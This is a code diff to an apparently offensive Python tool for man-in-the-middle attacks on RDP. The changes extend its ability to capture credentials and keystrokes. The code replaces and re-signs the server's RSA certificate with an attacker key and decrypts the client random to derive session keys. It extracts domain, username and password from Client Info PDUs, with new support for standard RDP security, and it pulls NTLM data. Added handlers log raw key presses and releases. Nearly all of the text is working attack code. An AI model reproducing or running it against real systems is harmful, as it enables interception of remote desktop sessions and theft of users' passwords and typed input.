@@ -117,20 +117,28 @@ def extract_client_random(bytes, crypto):
             client_rand = rsa_decrypt(client_rand, crypto["mykey"])
             crypto["client_rand"] = client_rand
             generate_session_keys(crypto)
-            return(b"Client random: " + hexlify(client_rand))
+            crypto.update({"client_rand": client_rand})
     return {"crypto": crypto}
 
 
 
 
-def extract_credentials(bytes, m):
+def extract_credentials(bytes, m, standard_rdp_sec=False):
     # Client Info PDU
     # "0x0040 MUST be present"
-    domlen, userlen, pwlen = [
-        struct.unpack('>H', unhexlify(x))[0]
-        for x in m.groups()
-    ]
-    offset = 37
+
+    if standard_rdp_sec:
+        domlen, userlen, pwlen = [
+            struct.unpack('<H', unhexlify(x))[0]
+            for x in m.groups()
+        ]
+        offset = len(m.group(0))//2
+    else:
+        domlen, userlen, pwlen = [
+            struct.unpack('>H', unhexlify(x))[0]
+            for x in m.groups()
+        ]
+        offset = 37
     if domlen + userlen + pwlen < len(bytes):
         domain = substr(bytes, offset, domlen).decode("utf-16")
         if domain == "":
@@ -181,6 +189,14 @@ def extract_key_press(bytes):
             result += extract_key_press(
                 b"\x44%c%s" % (len(bytes)-2, bytes[2:-2])
             ) + b"\n"
+    elif len(bytes) == 2:
+        event = bytes[0]
+        key = bytes[1]
+        key = translate_keycode(key)
+        if event == 1 and key:
+            result += b"Key release:                 %s\n" % key.encode()
+        elif key:
+            result += b"Key press:   %s\n" % key.encode()
     else:
         event = bytes[-5]
         key = bytes[-4]
@@ -194,7 +210,8 @@ def extract_key_press(bytes):
 
 def replace_server_cert(bytes, crypto):
     old_sig = sign_certificate(crypto["first5fields"] +
-                               crypto["pubkey_blob"])
+                               crypto["pubkey_blob"],
+                               len(crypto["sign"]))
     assert old_sig == crypto["sign"]
     key_len = len(crypto["modulus"])-8
     crypto["mykey"] = generate_rsa_key(key_len*8)
@@ -202,8 +219,9 @@ def replace_server_cert(bytes, crypto):
     old_modulus = crypto["modulus"]
     result = bytes.replace(old_modulus, new_modulus)
     new_pubkey_blob = crypto["pubkey_blob"].replace(old_modulus,
-                                                             new_modulus)
-    new_sig = sign_certificate(crypto["first5fields"] + new_pubkey_blob)
+                                                    new_modulus)
+    new_sig = sign_certificate(crypto["first5fields"] + new_pubkey_blob,
+                               len(crypto["sign"]))
     result = result.replace(crypto["sign"], new_sig)
 
     return result
@@ -235,17 +253,28 @@ def parse_rdp(bytes, vars, From="Client"):
     return result
 
 
-def parse_rdp_packet(bytes, crypto=None, From="Client"):
+def parse_rdp_packet(bytes, vars=None, From="Client"):
 
     if len(bytes) < 4: return b""
 
-    if sym_encryption_enabled(crypto):
+    if "crypto" in vars and sym_encryption_enabled(vars["crypto"]):
         bytes = decrypt(bytes, From=From)
 
     result = {}
     # hexlify first because \x0a is a line break and regex works on single
     # lines
 
+    # get creds if standard rdp security
+    regex = b".*0{8}3b010000(.{4})(.{4})(.{4})0{8}"
+    m = re.match(regex, hexlify(bytes))
+    if m:
+        try:
+            result.update(extract_credentials(bytes, m, standard_rdp_sec=True))
+        except:
+            pass
+
+
+    # get creds otherwise
     # "0x0040 MUST be present"
     regex = b".{30}40.{20}(.{4})(.{4})(.{4})"
     m = re.match(regex, hexlify(bytes))
@@ -254,6 +283,7 @@ def parse_rdp_packet(bytes, crypto=None, From="Client"):
             result.update(extract_credentials(bytes, m))
         except:
             pass
+
 
     regex = b".*%s0002000000" % hexlify(b"NTLMSSP")
     m = re.match(regex, hexlify(bytes))
@@ -265,11 +295,12 @@ def parse_rdp_packet(bytes, crypto=None, From="Client"):
     if m:
         result.update(extract_ntlmv2(bytes, m))
 
-    if crypto and "client_rand" in crypto:
+    if "crypto" in vars and "client_rand" in vars["crypto"]:
         regex = b".{14,}01.*0{16}"
         m = re.match(regex, hexlify(bytes))
-        if m and crypto["client_rand"] == b"":
-            result.update(extract_client_random(bytes))
+        if m and vars["crypto"]["client_rand"] == b"":
+            client_rand = extract_client_random(bytes, vars["crypto"])
+            result.update(client_rand)
 
     regex = b".*020c.*%s" % hexlify(b"RSA1")
     m = re.match(regex, hexlify(bytes))
@@ -295,6 +326,14 @@ def parse_rdp_packet(bytes, crypto=None, From="Client"):
         if keypress:
             print("\033[31m%s\033[0m" % keypress.decode())
 
+    # keyboard events in standard rdp
+    regex = b"^0[01]..$"
+    m = re.match(regex, hexlify(bytes))
+    if result == {} and m:
+        keypress = extract_key_press(bytes)
+        if keypress:
+            print("\033[31m%s\033[0m" % keypress.decode())
+
     return result
 
 
@@ -305,7 +344,7 @@ def tamper_data(bytes, vars, From="Client"):
         regex = b".{14,}01.*0{16}"
         m = re.match(regex, hexlify(bytes))
         if m and not vars["crypto"]["client_rand"] == b"":
-            result = reencrypt_client_random(bytes)
+            result = reencrypt_client_random(vars["crypto"], bytes)
 
     regex = b".*020c.*%s" % hexlify(b"RSA1")
     m = re.match(regex, hexlify(bytes))
@@ -402,8 +441,11 @@ def print_var(k, vars):
     #  elif k == "server_challenge":
     #      result = b"Server Challenge: %s" % hexlify(vars[k])
     elif k == "keyboard_layout":
-        result = b"Keyboard Layout: 0x%x (%s)" % (vars[k],
+        try:
+            result = b"Keyboard Layout: 0x%x (%s)" % (vars[k],
                                                 KBD_LAYOUT_CNTRY[vars[k]])
+        except KeyError:
+            result = b"Keyboard Layout not recognized"
     else:
         try:
             result = b"%s: %s" % (k.encode(), str(vars[k]).encode)
